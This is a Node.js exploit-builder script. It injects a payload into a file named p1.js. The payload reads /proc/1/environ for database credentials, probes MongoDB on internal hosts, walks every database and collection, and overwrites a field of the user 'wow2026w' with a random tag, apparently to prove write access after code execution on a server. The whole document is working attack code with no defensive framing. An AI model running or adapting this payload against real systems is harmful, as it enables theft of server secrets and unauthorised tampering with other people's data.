const fs=require('fs');
const tag='DB'+Math.floor(Math.random()*90000+10000);
const code=`
const fs=require('fs');
const env={}; try{for(const l of fs.readFileSync('/proc/1/environ','latin1').split('\\0')){const i=l.indexOf('=');if(i>0)env[l.slice(0,i)]=l.slice(i+1)}}catch(e){}
let Mongo; for (const p of ['/app/node_modules/mongodb','/app/node_modules/mongoose/node_modules/mongodb','mongodb']) { try{ Mongo=require(p); break }catch(e){} }
if(!Mongo){ console.log('NODRIVER'); process.exit(0) }
const uris=[env.MONGODB_URI,env.MONGO_URL,env.DATABASE_URL,'mongodb://mongo:27017','mongodb://mongodb:27017','mongodb://db:27017','mongodb://127.0.0.1:27017'].filter(Boolean);
(async()=>{
 for(const u of uris){
  const c=new Mongo.MongoClient(u,{serverSelectionTimeoutMS:3000});
  try{ await c.connect() }catch(e){ console.log('X '+u.slice(0,40)); continue }
  const dbs=await c.db().admin().listDatabases();
  for(const d of dbs.databases){
    const db=c.db(d.name);
    try{
      const cols=(await db.listCollections().toArray()).map(x=>x.name);
      for(const n of cols){
        const doc=await db.collection(n).findOne({username:'wow2026w'});
        if(doc){ await db.collection(n).updateOne({_id:doc._id},{$set:{city:'${tag}'}}); console.log('OK '+d.name+'.'+n); await c.close(); return }
      }
    }catch(e){}
  }
  await c.close();
 }
 console.log('NOHIT');
})();
`;
let t=fs.readFileSync('p1.js','utf8');
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
